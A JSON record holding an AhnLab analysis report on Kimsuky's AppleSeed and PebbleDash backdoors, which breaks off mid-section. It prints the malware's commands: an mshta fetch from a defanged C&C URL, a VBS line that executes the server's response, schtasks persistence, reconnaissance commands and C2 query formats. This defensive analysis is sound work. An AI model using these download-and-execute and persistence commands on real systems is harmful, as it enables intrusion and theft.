{
    "id": "e53ce04e-fcbc-4a50-8f3f-27839847bbb2",
    "created_at": "2022-10-25T16:48:16.492813Z",
    "updated_at": "2025-03-27T02:17:23.71933Z",
    "deleted_at": null,
    "sha1_hash": "3cef77aed2d0be3eeacd1f63d421ece2656f7a93",
    "title": "Kimsuky Group's APT Attacks (AppleSeed, PebbleDash)",
    "authors": "Ahnlab",
    "file_creation_date": "2022-01-03T17:51:16Z",
    "file_modification_date": "2022-01-03T17:51:16Z",
    "file_size": 3322566,
    "plain_text": "TLP: AMBER TLP: GREEN\n\n# Analysis Report of \n\n Kimsuky Group's APT Attacks (AppleSeed, PebbleDash)\n\nAhnLab Security Emergency response Center (ASEC)\n\nNovember 16th, 2021\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\nGuide on Document Classification\n\nPublications or provided content can only be used within the scope allowed for each classification\nas shown below.\n\nClassification Distribution Targets Notices\n\nDocuments that can be only accessed by the\n\nReports only provided for recipient or the recipient department\n\nTLP: RED\n\ncertain clients and tenants Cannot be copied or distributed except by the\n\nrecipient\n\nCan be copied and distributed within the recipient\norganization (company) of reports\n\nReports only provided for\n\nMust seek permission from AhnLab to use the\n\nTLP: AMBER limited clients and tenants\n\nreport outside the organization, such as for\neducational purposes\n\nCan be freely used within the industry and utilized\nas educational materials for internal training,\n\nReports that can be used by occupational training, and security manager\n\nTLP: GREEN\n\nanyone within the service training\n\nStrictly limited from being used as presentation\nmaterials for the public\n\nCite source\nAvailable for commercial and non-commercial\n\nTLP: WHITE Reports that can be freely uses\n\nused\n\nCan produce derivative works by changing the\ncontent\n\n|Classification|Distribution Targets|Notices|\n|---|---|---|\n|TLP: RED|Reports only provided for certain clients and tenants|Documents that can be only accessed by the recipient or the recipient department Cannot be copied or distributed except by the recipient|\n|TLP: AMBER|Reports only provided for limited clients and tenants|Can be copied and distributed within the recipient organization (company) of reports Must seek permission from AhnLab to use the report outside the organization, such as for educational purposes|\n|TLP: GREEN|Reports that can be used by anyone within the service|Can be freely used within the industry and utilized as educational materials for internal training, occupational training, and security manager training Strictly limited from being used as presentation materials for the public|\n|TLP: WHITE|Reports that can be freely used|Cite source Available for commercial and non-commercial uses Can produce derivative works by changing the content|\n\n\nRemarks\n\n\nIf the report includes statistics and indices, some data may be rounded,\nmeaning that the sum of each item may not match the total.\n\nThis report is protected by copyright law and as such,\nreprinting and reproducing it without permission is prohibited in all cases.\n\nSeek permission from AhnLab in advance\nif you wish to use a part or all of the report.\n\nIf you reprint or reproduce the material without the permission of the organization\nmentioned above, you may be held accountable for criminal or civil liability.\n\n\n2\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\nThe version information of this report is as follows:\n\n|Version|Date|Details|\n|---|---|---|\n|0.1|November 16th, 2021|Analysis Report on Kimsuky Group's APT Attacks (AppleSeed, PebbleDash) created|\n|0.2|November 16th, 2021|Added content|\n|0.3|November 19th, 2021|Added content and fixed typos|\n\n\n3\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\nTable of Contents\nOverview .............................................................................................................................................................. 6\n\n1. Distribution method .......................................................................................................................................... 6\n\n1.1. Script ......................................................................................................................................................... 7\n\n1.2. Executable File (pif) ................................................................................................................................ 10\n\n1.2.1. Thread #1 ........................................................................................................................................ 11\n\n1.2.2. Thread #2 ........................................................................................................................................ 11\n\n1.2.3. Thread #3 ........................................................................................................................................ 16\n\n1.2.4. Thread #4 ........................................................................................................................................ 16\n\n1.3. Additional Script ...................................................................................................................................... 16\n\n1.3.1. Primary Script .................................................................................................................................. 16\n\n1.3.2. Secondary Script ............................................................................................................................. 17\n\n2. Analysis of Downloader Malware .................................................................................................................. 18\n\n2.1. Downloader ............................................................................................................................................. 19\n\n2.1.1. Install Process ................................................................................................................................. 19\n\n2.1.2. Downloader Behavior ...................................................................................................................... 20\n\n3. Analysis of AppleSeed ................................................................................................................................... 21\n\n3.1. Analysis of Default Features ................................................................................................................... 23\n\n3.1.1. Initial Routine ................................................................................................................................... 23\n\n3.1.2. Installation ........................................................................................................................................ 24\n\n3.1.3. Privilege Escalation ......................................................................................................................... 26\n\n3.1.4. Thread ............................................................................................................................................. 26\n\n3.2. Analysis of Info-stealing Feature ............................................................................................................ 30\n\n3.2.1. Information Theft.............................................................................................................................. 31\n\n3.2.2. Additional Commands ..................................................................................................................... 34\n\n3.3. C&C Communication Using Emails ........................................................................................................ 35\n\n3.3.1. Ping Thread (SMTP) ........................................................................................................................ 36\n\n3.3.2. Command Thread (IMAP) ............................................................................................................... 36\n\n4. Analysis of PebbleDash ................................................................................................................................. 38\n\n4.1. Analysis of Initial PebbleDash ................................................................................................................ 39\n\n4.1.1. Initial Routine ................................................................................................................................... 39\n\n4.1.2. Recovering Settings Data ................................................................................................................ 42\n\n4.1.3. C&C Communications ..................................................................................................................... 45\n\n4.1.4. Performing Commands .................................................................................................................... 49\n\n4.2. Analysis of Latest PebbleDash ............................................................................................................... 51\n\n4.2.1. Initial Routine ................................................................................................................................... 51\n\n4.2.2. Recovering Settings Data ................................................................................................................ 53\n\n4.2.3. C&C Communications ..................................................................................................................... 54\n\n4.2.4. Performing Commands .................................................................................................................... 57\n\n5. Post Infection ................................................................................................................................................. 58\n\n4\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n5.1. Remote Control....................................................................................................................................... 58\n\n5.1.1. Meterpreter ...................................................................................................................................... 58\n\n5.1.2. HVNC (TinyNuke) ............................................................................................................................ 60\n\n5.1.3. TightVNC ......................................................................................................................................... 63\n\n5.1.4. RDP Wrapper .................................................................................................................................. 64\n\n5.2. RDP Related ........................................................................................................................................... 64\n\n5.2.1. Adding RDP User ............................................................................................................................ 64\n\n5.2.2. RDP Patcher .................................................................................................................................... 64\n\n5.3. Privilege Escalation ................................................................................................................................ 65\n\n5.3.1. UACMe ............................................................................................................................................ 65\n\n5.3.2. CVE-2021-1675 Vulnerability .......................................................................................................... 67\n\n5.4. Collecting Information ............................................................................................................................. 69\n\n5.4.1. Mimikatz ........................................................................................................................................... 69\n\n5.4.2. Collecting Chrome Account Credentials .......................................................................................... 70\n\n5.4.3. Keylogger ......................................................................................................................................... 70\n\n5.5. Others ..................................................................................................................................................... 71\n\n5.5.1. Proxy Malware ................................................................................................................................. 71\n\nAhnLab's Response ........................................................................................................................................... 72\n\nConclusion ......................................................................................................................................................... 75\n\nIOC (Indicators Of Compromise) ....................................................................................................................... 75\n\nFile Path and Name ....................................................................................................................................... 75\n\nFile Hashes (MD5) ......................................................................................................................................... 77\n\nRelated Domain, URL, and IP Address ......................................................................................................... 83\n\nReference .......................................................................................................................................................... 87\n\n5\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\nOverview\n\nThis document is an analysis report on types of malware recently utilized by the Kimsuky group. The\nKimsuky group is mainly known for launching social engineering attacks, such as spear phishing. Judging\nby the names of the attached files, the group seems to be targeting those working in the fields related to\nNorth Korea and foreign affairs. According to the scan logs of AhnLab's ASD infrastructure, the threat\ngroup has been mainly targeting individual users rather than companies, but has also been continuously\nattacking public institutions and companies. Korean universities have been one of their major targets, but\nrecords exist of them attacking IT, information and communications, and construction institutions as well.\n\nNormally, malware strains assumed to be attachments of spear phishing attack emails are disguised as\ndocument files. If a user executes the file, malware of this type executes the document that corresponds\nto the disguised file name and tricks the user into thinking that they have opened a normal file. It installs\nadditional malware strains at the same time, mainly AppleSeed and PebbleDash. AppleSeed has been\npresent since 2019 and when compared to other malware strains based on the IOCs organized by AhnLab,\nit takes up a significant portion due to being used in various other attacks. PebbleDash is one of the\nNukeSped variants, known for having been used by the Lazarus group since the past. Recently, it has\nbeen found that a new variant is being used for attacks along with AppleSeed.\n\nThey are both backdoors used by the Kimsuky group that can stay in the system and perform malicious\nbehaviors by receiving commands from the attacker. The attacker can use backdoor to install another\nremote control malware, such as Meterpreter and HVNC. The attacker can also install various other types\nof malware for privilege escalation and account credential theft.\n\nThis report will analyze the overall flow of attacks using AppleSeed and PebbleDash, starting from\nmalware strains that are initially distributed. As both malware types are not confined to a single form, this\nreport will compare each type and focus on similarities and differences, and also explain in detail other\ntypes of malware that the two malware additionally install.\n\n1. Distribution method\n\nLately, the Kimsuky group has been mainly distributing malware via spear phishing email attachments.\nMalware that creates AppleSeed or PebbleDash is usually disguised as a document file, such as pdf, docx,\nand hwp. These malware strains take a disguise of document files that discuss current affairs, such as\ndiplomacy, defense, and COVID-19. However, the attacker does use other file types, such as jpg image\nor specific dat depending on the attack target. The files thought to be attached to spear phishing emails—\nthe initial distribution files—all have either an executable file or script format.\n\nThe script file is a wsf or js format malware, which creates and executes a normal document file that\ncorresponds to the disguised name when it is run to make the user think that a normal document file has\nbeen opened. The executable is the same as the script file in terms of its distribution method and behaviors.\nOne thing to note is that the file is distributed in PIF extensions.\n\nBoth the script and the executable show normal document files upon being executed and installed\ninternally encoded malware into the system. When backdoors, such as AppleSeed or PebbleDash, are\ninstalled successfully, they can communicate with the C&C server afterward to steal information about the\nuser environment or install additional malware.\n\n6\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n1.1. Script\n\nSamples distributed in the script form can all be executed immediately on Windows. Upon being executed,\nthey create and run AppleSeed malware and normal document files. The confirmed samples take the form\nof JS or WSF file, as shown in Figure 1. They have different extensions but are functionally the same, as\neach is configured in the same JS code.\n\n**Figure 1. WSF (left) and JS sample (right)**\n\nThe samples can also be divided into two types depending on the method of code implementation. Figure\n1 shows samples that declare function at the start because they have features, such as decoding, autodelete, and file deletion, implemented as separate functions. Figure 2 shows another sample that makes\nno use of functions and starts with the try - catch statement.\n\n**Figure 2. Sample without functions**\n\nBoth types essentially perform the same behaviors. Decoding the Base64-encoded data yields AppleSeed\nmalware and a normal document file. The malware creates two files in a particular path and executes\nthem.\n\n - Command: powershell.exe -windowstyle hidden regsvr32.exe /s [AppleSeed malware path]\n\nFor Base64 decoding, the samples with functions use a method of running Powershell command, and\nsamples that do not declare functions use certutil.exe to decode the file, as shown in Figure 3.\n\n7\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n**Figure 3. Decoding using certutil.exe**\n\nSome samples may additionally access a particular URL as shown in Figure 4. It appears that the samples\ndo so to report the infection status.\n\n**Figure 4. Accessing URL to report infection**\n\nThe name of the normal document file created in the process above is similar to the name of the distributed\nfile with its content related to the file name.\n\n**Figure 5. image_confirm_v1.jpg file**\n\n8\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n**Figure 6. High-frequency transfer switch default performance temperature testing report.hwp**\n\n**Figure 7. *** News 2021-05-07.pdf file**\n\n9\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n**Figure 8. 0421.hwp file**\n\n1.2. Executable File (pif)\n\nFor samples distributed in the PIF form, they create and execute malware and normal documents while\nperforming additional malicious behaviors through mstha at the same time. This report will list the analysis\ninformation of the \"Progress Check_211013.pif (aa65c226335539c162a9246bcb7ec415) sample.\"\n\nWhen the malware is executed, it creates four threads, as shown in Table 1. Each thread has a specialized\nfeature that is summarized in the following table.\n\n**Thread** **Behavior**\n\nThread #1 Creating and running AppleSeed malware\n\nThread #2 Creating and running normal document file\n\nThread #3 Running mshta for performing additional\n\nmalicious behaviors\n\nThread #4 Creating and running auto-delete BAT file\n**Table 1. Summary of behavior for each thread**\n\nMost PIF droppers, including the analysis target sample, install VBS malware using mshta. However,\nsome samples do not follow this pattern. Some samples lack the dropper feature that installs additional\nmalware, while others install certain downloader malware types or malware that adds an RDP account.\n\n10\n\n|Thread|Behavior|\n|---|---|\n|Thread #1|Creating and running AppleSeed malware|\n|Thread #2|Creating and running normal document file|\n|Thread #3|Running mshta for performing additional malicious behaviors|\n|Thread #4|Creating and running auto-delete BAT file|\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\nThere have also been samples with different internal code configurations that install PebbleDash backdoor\ninstead of AppleSeed.\n\n1.2.1. Thread #1\n\nThread #1 in the sample creates a folder in the following path and installs AppleSeed.\n\n - Path %APPDATA%\\Media\n\n - Filename wmi-ui-[random name].db\n\n - File Hash cae87921ea508d6c8d8c1de9dd769ae1\n\nThe following decryption routine is used, notably utilizing a MMX command.\n\n**Figure 9. Data decryption routine**\n\nWhen the file is decrypted and created, the sample uses the ShellExecuteExW() function to run the\nmalware through regsvr32.exe.\n\n\n\n- Execution Argument: C:\\Windows\\system32\\regsvr32.exe /s \"C:\\Users\\[user\nname]\\AppData\\Roaming\\Media\\wmi-ui-947ef993.db\"\n\n\n1.2.2. Thread #2\n\nThread #2 thread creates and executes the normal document file to trick users into thinking that they have\nopened an innocuous document file, not a malware. It uses the same algorithm used in Thread #1 during\nthe document creation process to decrypt the data. The normal document created usually uses a name\nsimilar to the filename of the distributed malware with contents related to the title.\n\nExamples of normal documents are shown in Figure 10. One thing to note is that the file with .h5\nextensions use HDF (Hierarchical Data Format) file format, which is not widely used.\n\n11\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n**Figure 10. Process Check_211013.pdf file**\n\n**Figure 11. JR_210604_R1***_F***_Pf***.pptx file - (certain strings blurred as ***)**\n\n\n12\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n**Figure 12. 211014-915mm(0deg).h5 file**\n\n**Figure 13. [Business Cooperation Agreement] Cooperation (Old 2) 21-001_Cooperation**\n\n**request for tasks related to purchase order for development and purchase & incoming**\n\n**inspection process_Purchase Team 2.pdf file**\n\n\n13\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n**Figure 14. 2021 *** Work Report Edited.pdf file**\n\n**Figure 15. 1. 2021 Business Plan (Supplemented by referencing materials from Installation**\n\n**Agency) - 210316-1.hwp file**\n\n14\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n**Figure 16. 210927 COVID-19 Response (Boryeong-Taean 1)_merged.hwp file**\n\n**Figure 17. ROK-US summit (May 21st) Reference Material (edited).hwp file**\n\n\n15\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n1.2.3. Thread #3\n\nThread #3 executes scripts using mstha to perform additional malicious behaviors. It executes the\nfollowing command through the CreateProcessA() function. As for the script malware that is downloaded\nand executed through mshta.exe, it will be discussed in 1.3. Additional Script.\n\n\n\n- Command: mshta.exe hxxp://get.seino.p-e[.]kr/?query=5\n\n\n1.2.4. Thread #4\n\nThe thread creates a BAT file with a random name in the %TEMP% directory and executes it via the\nCreateProcessW() function. The executed script, which is a command that deletes the created BAT file is\nshown below.\n\nThe main thread is configured to be terminated after all additionally created threads are completed. When\nthe malware is terminated, the executed BAT file deletes itself and the BAT script.\n\n:goto_redel\nrd /s /q \"[executable file name]\"\ndel \"[executable file path]\"\nif exist \"[executable file path]\" goto goto_redel\ndel \"C:\\Users\\[user name]\\AppData\\Local\\Temp\\[random name].tmp.bat\"\n\n1.3. Additional Script\n\nThe PIF dropper malware mentioned earlier installs AppleSeed backdoor to trick users into thinking that\nthey are opening an innocuous document file. Also, it also installs additional external payloads. To do so,\nit downloads a script through mshta.exe from the third thread and executes it. The downloaded VBS script\ncan send basic information of the infected environment and download additional malware.\n\n1.3.1. Primary Script\n\nFirst, the short VBS script is downloaded through mshta.exe and executed. The code simply requests a\ncertain URL and executes another VBS script received as a response.\n\n16\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n**Figure 18. First Script (Deobfuscated)**\n\nThe second script that is run by the script above is a VBS script, consisting of approximately one hundred\nlines. It steals information about the infected system and sends it to the C&C server. A function that can\ndownload and execute files is also included, but it may not always be executed depending on the situation.\n\n1.3.2. Secondary Script\n\nTo collect the information of the infected system, the script first executes the following commands and\nsaves the result as a file MSO2069.acl.\n\n - hostname\n\n - systeminfo\n\n - net user\n\n - query user\n\n - route print\n\n - ipconfig /all\n\n - arp -a\n\n - netstat -ano\n\n - tasklist\n\n - tasklist /svc\n\nThe file is encoded with certutil.exe that is a default Windows program and saved as a file with the name\nMSO2079.acl, which is then sent to the C&C server. The data sent takes a disguise of something similar\nto a certificate to bypass detection as shown in Figure 19.\n\n17\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n**Figure 19. Example of packet content that is sent to C2 server**\n\nAfterward, the script registers the following two commands to the task scheduler.\n\n - cmd /c schtasks /Create /SC minute /MO 20 /TN GoogleCache /TR \"wscript //e:vbscript //b\nC:\\ProgramData\\Chrome\\.NetFramework.xml\" /f\n\n - cmd /c schtasks /Create /SC minute /MO 1 /TN GoogleUpdate /TR \"regsvr32 /s\nC:\\ProgramData\\Chrome\\update.cfg\" /f\n\nThe content of the .NetFramework.xml file that is created by the script is shown below. It accesses a\nparticular URL and executes the script that is sent in response.\n\nOn Error Resume Next:Set sztnfpcgijjomecl =\nCreateObject(\"MSXML2.ServerXMLHTTP.6.0\"):sztnfpcgijjomecl.open \"POST\", \"hxxp://get.seino.pe[.]kr/index.php?query=6\", False:sztnfpcgijjomecl.Send:Execute(sztnfpcgijjomecl.responseText):\n\nThe script that was downloaded during the analysis is a code that forcibly terminates the mshta.exe\nprocess that is currently being executed as shown below.\n\nSet WShell=CreateObject(\"WScript.Shell\"):retu=WShell.run(\"cmd /c taskkill /im mshta.exe /f\", 0,true)\n\nIn essence, one task downloads an additional script from external sources and executes it. The other task\nexecutes a file in a certain path using regsvr32. If the attacker responds with a script that installs additional\nmalware files in the C:\\ProgramData\\Chrome\\update.cfg path instead of the auto-termination script, the\nadditional malware will be executed by the second task scheduler.\n\n2. Analysis of Downloader Malware\n\nAs mentioned earlier, there is a downloader malware among those installed by the PIF dropper. This\nmalware operates after being registered to the task scheduler and essentially performs the role of a\ndownloader: periodically accessing the C&C server to download and execute additional payloads.\n\nCurrently, multiple downloader malware types can be checked in AhnLab's ASD infrastructure. They likely\n\n18\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\ncreated malware strains used by the Kimsuky group. Note that according to a report made by S2W LAB,\nthere has been cases of the downloader malware downloading and installing the Meterpreter backdoor in\ninfected environments.[1]\n\n2.1. Downloader\n\n2.1.1. Install Process\n\nAs for the analysis sample, when the downloader malware is executed, it first creates the Intel folder in\nthe %ALLUSERSPROFILE% (ProgramData) folder and copies itself with the name \"Driverdriver.cfg.\"\nMost samples choose ProgramData as the installation folder, but some select %APPDATA%\n(\\AppData\\Roaming) instead. There are also cases of the file name being driver.cfg instead of\nDriverdriver.cfg.\n\nWhen the copying process is over, the malware executes the file in the copied path using regsvr32.exe.\nThe actual malicious behaviors are performed in the downloader process that is executed following the\nsteps shown above. When the install process is over, the file that is initially executed is auto-deleted. It is\na method that uses a batch file and is frequently employed by malware strains that were recently used by\nthe Kimsuky group.\n\n**Figure 20. Auto-delete Batch file**\n\nIt then checks for concurrent execution using a mutex. The sample for the current analysis uses the\nfollowing name for the mutex:\n\n**- Mutex: windows update server real time mui cache\"**\n\nThe malware uses a unique 8-byte sized random binary data to check whether the system is infected or\nnot. It first scans for the following registry key. If the key does not exist, it creates a random 0x08 byte\nbinary value and uses this value for the registry shown below. The value is used to communicate with the\nC&C server.\n\n\n\n- Added Registry Key: HKCU\\Software\\Microsoft\\FTP / Use Smtp\n\n\n1 [https://vblocalhost.com/conference/presentations/operation-newton-hi-kimsuky-did-an-appleseed-](https://vblocalhost.com/conference/presentations/operation-newton-hi-kimsuky-did-an-appleseed-really-fall-on-newtons-head/)\n\n[really-fall-on-newtons-head/](https://vblocalhost.com/conference/presentations/operation-newton-hi-kimsuky-did-an-appleseed-really-fall-on-newtons-head/)\n\n\n19\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n**Figure 21. Created registry key**\n\nThe malware registers the following command to the task scheduler so that it executes every 30 minutes.\n\n\n\n- schtasks /create /f /tn \"Intel\\Disk\\Volume1\" /tr \"C:\\Windows\\system32\\regsvr32.exe /s\n\"C:\\ProgramData\\Intel\\Driverdriver.cfg\"\" /sc minute /mo 30\n\n\n2.1.2. Downloader Behavior\n\nThe malware uses the HTTP protocol and the following three types of queries to communicate with the\nC&C server. u is the unique identifier that was discussed earlier, and i means a command. p appears to\nbe a secondary parameter, but as the malware has a simple structure, it would not have much significance.\n\n\n\n**- Format: http://[C&C URL]/init/image?i=[command]&u=[unique identifier]&p=[secondary parameter]**\n\n\nParameter\n**Table 2. Queries used for C&C communications**\n\n**Command**\n\n**Feature**\n**Type**\n\nInit Establish\nconnection\n\nPing PING\n\nDown Download\n\ncomplete\n**Table 3. Types of commands used**\n\nThe following URL is used when the malware initially connects with the C&C server. The\n\"6352db963f367e75\" part is the 8-byte binary data that was randomly generated and saved in the registry\nkey converted into a string.\n\n**- Example: http://[C&C URL]/init/image?i=init&u=6352db963f367e75&p=ya**\n\nThe User-Agent string used to communicate with the C&C server is as follows:\n\n20\n\n|Query|Meaning|\n|---|---|\n|I|Command|\n|U|Unique Identifier|\n|P|Secondary Parameter|\n\n|Command Type|Feature|\n|---|---|\n|Init|Establish connection|\n|Ping|PING|\n|Down|Download complete|\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n**- User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)**\nChrome/79.0.3945.130\n\nThe malware then sends a PING query. Up until this part of the process, the data received from the C&C\nserver is not used. It seems that this part is a reset process for the sample to send infection status to the\nC&C server and download additional files.\n\n**- Example: http://[C&C URL]/init/image?i=ping&u=6352db963f367e75&p=wait..**\n\nNow the actual downloading begins. The download URL is \"[random 8-byte string].down\" as shown below.\n\n**- Format: http://[C&C URL]/init/[Unique Identifier].down**\n\n**- Download URL Example: http://[C&C URL]/init/6352db963f367e75.down**\n\nThe downloader downloads files using the URLDownloadToFileW() API without going through any\ncomplicated processes. The download path is shown below. The name of the file also has a random value\nin the \"cachew[random name].cache\" format.\n\n**- Download Path Example: C:\\ProgramData\\Intel\\Driver\\cachew-671417171.cache**\n\nAs the downloaded file is encoded with 4-byte Xor, it needs to be additionally decoded.\n\n**Figure 22. Hard-coded 0x4 Byte Xor key**\n\n - Xor Key: 96 50 28 44\n\nThe decoded malware is executed. As the downloader uses regsvr32.exe upon executing it, the additional\npayloads likely only exist as DLLs. After the process is over, the result is sent to the C&C server using the\nexample URL shown below.\n\n\n\n**- Example: http://[C&C URL]/init/image?i=down&u=6352db963f367e75&p=ya**\n\n\n3. Analysis of AppleSeed\n\nAmong types of malware installed through the script malware or PIF dropper, there is a backdoor called\nAppleSeed. It performs commands it received from the attacker via the C&C server and sends the result\nback. It also includes features, such as a downloader that installs additional malware strains, performs\nkeylogging and screenshots, and steals information by collecting files from the user system.\n\n21\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\nThe malware is mainly divided into two types depending on the C&C communications method. Most of\nthem use the HTTP protocol, but some strains communicate with C&C through emails. There are also\nother differences in features. Not every type of AppleSeed is equipped with the info-stealing feature. Some\ntypes may only contain basic features of receiving and executing additional malware or commands from\nthe C&C server. Among all samples, this report will discuss those that use HTTP or emails to communicate\nwith C&C and those that include info-stealing features.\n\nSome samples appear to contain binaries built using debug mode by the attacker. As such, one can check\nthe debug messages designated by the developer for each function as shown in Figure 23.\n\n**Figure 23. Debug message output routine included in function**\n\n**Figure 24. DebugView log**\n\nThe target chosen for the analysis is a sample built in debug mode, the one that can be examined to\nconfirm the developer's intention. However, as the discussed sample's info-stealing feature is disabled,\n\n22\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\nanother sample with the feature will be analyzed for the section explaining such feature. As all of the\nsamples use the HTTP protocol, AppleSeed sample that communicates with the C&C server via email will\nbe discussed.\n\n - Only has default features: 739d14336826d078c40c9580e3396d15\n\n - Possesses additional info-stealing feature: 2cb77491573acc5e8198d8cf68300106\n\n - Communicates with C&C via email: dacb71c5eac21b41bb8077fe2e9f5a25\n\n3.1. Analysis of Default Features\n\n3.1.1. Initial Routine\n\nUpon execution, AppleSeed first goes through API Resolving in the initialization routine. The names of the\nAPI functions that will find the URL are all encoded, and these encoded strings are a trait of AppleSeed.\nBesides API functions, AppleSeed harbors most of the strings, such as C&C URL and User-Agent, in\nencoded forms as shown in Figure 25.\n\n**Figure 25. Obfuscation for strings used in AppleSeed**\n\nThe original version of the string that is decoded first\n(\"9d99c9fe01bc57d39df2546955a7021a9fe6567457fb001a9dad543755e70258\") is \"kernel32.dll.\" The\nstring is mainly divided into two parts. The first 16 characters are used as a key for Xor encryption, and\nthe part after the initial 16 characters is the original string that is encrypted and saved.\n\n - Xor Key: 9d99 c9fe 01bc 57d3\n\n - Encoded String (Xor Key): 9df2 5469 55a7 021a 9fe6 5674 57fb 001a 9dad 5437 55e7 0258\n\nNote that the Xor encoding method used is not a simple one; the following encrypted strings are\nsimultaneously used for the next Xor encoding.\n\n\n( XorKeyn xor EncStrn-1 ) xor EncStrn\n\n\n( 0x9d99 xor 0x0000 ) xor 0x9df2 = 0x006b = \"k\"\n( 0xc9fe xor 0x9df2 ) xor 0x5469 = 0x0065 = \"e\"\n( 0x01bc xor 0x5469 ) xor 0x55a7 = 0x0072 = \"r\"\n( 0x57d3 xor 0x55a7 ) xor 0x021a = 0x006e = \"n\"\n( 0x9d99 xor 0x021a ) xor 0x9fe6 = 0x0065 = \"e\"\n( 0xc9fe xor 0x9fe6 ) xor 0x5674 = 0x006c = \"l\"\n( 0x01bc xor 0x5674 ) xor 0x57fb = 0x0033 = \"3\"\n( 0x57d3 xor 0x57fb ) xor 0x001a = 0x0032 = \"2\"\n( 0x9d99 xor 0x001a ) xor 0x9dad = 0x002e = \".\"\n\n\n23\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n( 0xc9fe xor 0x9dad ) xor 0x5437 = 0x0064 = \"d\"\n( 0x01bc xor 0x5437 ) xor 0x55e7 = 0x006c = \"l\"\n( 0x57d3 xor 0x55e7 ) xor 0x0258 = 0x006c = \"l\"\n\nAfter API Resolving, the malware finds the settings data. The data is encoded with the same algorithm\nthat was mentioned above. The data found includes the host and path of the C&C server, path to install\nthe DLL file, prefix that will be used as PCID, etc. The following is the settings data decoded from the\ncurrent analysis target sample.\n\n**Settings Item** **Decoded String**\n\nC&C URL \"yes24-mart.pe[.]hu\"\n\nC&C Path \"/bear\"\n\nInstallation Path \"Software\\Microsoft\\Windows\\Defender\"\n\nPcID Prefix \"D_Regsvr32\"\n**Table 4. AppleSeed settings data**\n\n3.1.2. Installation\n\nAppleSeed, which is a DLL format, is executed by regsvr32.exe. One of its characteristics is that it is\nalways installed on a certain path. The installation path is usually inside %ALLUSERSPROFILE%\n(ProgramData), but some samples are installed inside %APPDATA%.\n\nThe current analysis target sample is installed in %ALLUSERSPROFILE% with the exact path being\n\"Software\\Microsoft\\Windows\\Defender\" (extracted from the settings data shown in Table 4). The name\nof the installer is AutoUpdate.dll. It copies itself to create a batch file in\nthe %ALLUSERSPROFILE%\\temp\\ path with the original being deleted after. The path is later registered\nto the auto-run registry Run key with the name \"WindowsDefenderAutoUpdate\" to allow the file to be\nexecuted upon reboot.\n\n**Figure 26. BAT file used for auto-delete**\n\nThe malware then uses a mutex to check the concurrent execution. The mutex used by the current\nanalysis sample is \"DropperRegsvr32-20210504113516.\" As the Export DLL Name is \"dropperregsvr32(x86).dll\" and the DLL has a similar TimeStamp with the date information shown in the mutex\nname which appears to represent the malware's name that was decided during the development and its\ncreation date.\n\n**a. Execution Method**\nThe sample analyzed above is ultimately executed by being loaded through the regsvr32.exe process.\n\n24\n\n|Settings Item|Decoded String|\n|---|---|\n|C&C URL|\"yes24-mart.pe[.]hu\"|\n|C&C Path|\"/bear\"|\n|Installation Path|\"Software\\Microsoft\\Windows\\Defender\"|\n|PcID Prefix|\"D_Regsvr32\"|\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\nBut there are samples where the AppleSeed backdoor is loaded and executed by a different process. For\ninstance, the 541fa4fb60690ffbe48b24cd2eeda32e sample is loaded and executed by the explorer.exe\nprocess, the Windows Explorer that is currently being executed. It is initially loaded and executed by the\nregsvr32.exe process, but then it copies itself to the %TEMP% path and uses the DLL injection technique,\nshown in Figure 27, to make explorer.exe load AppleSeed.\n\n**Figure 27. DLL injection technique using CreateRemoteThread() API**\n\nThe method discussed above is a normal DLL injection technique, but there are other techniques as well,\nsuch as decoding AppleSeed that takes the form of Reflective DLL Loader and injecting it into\nexplorer.exe. There have also been multiple samples that target Internet Explorer (iexplore.exe) instead\nof explorer.exe for injection.\n\nOne sample type (8355964a47f248ed39caccb733aabc44) uses the DLL hijacking technique. It first\ncreates a normal program ALUpdate.exe (639abb6eb9e29b15c61feb7858d2ab40) in the\n\\AppData\\Roaming\\ESTsoft\\Common\\ESTUpdate.exe path and copies itself into the same path with the\nname \"ko-kr.dll.\" When the normal program ESTUpdate.exe is executed, DLL is loaded and executed.\n\n**Figure 28. Execution method using DLL hijacking technique**\n\n**b. Maintain Persistence**\nThe sample mentioned in Figure 28 registers the following Run key to maintain persistence.\n\n\n\n- 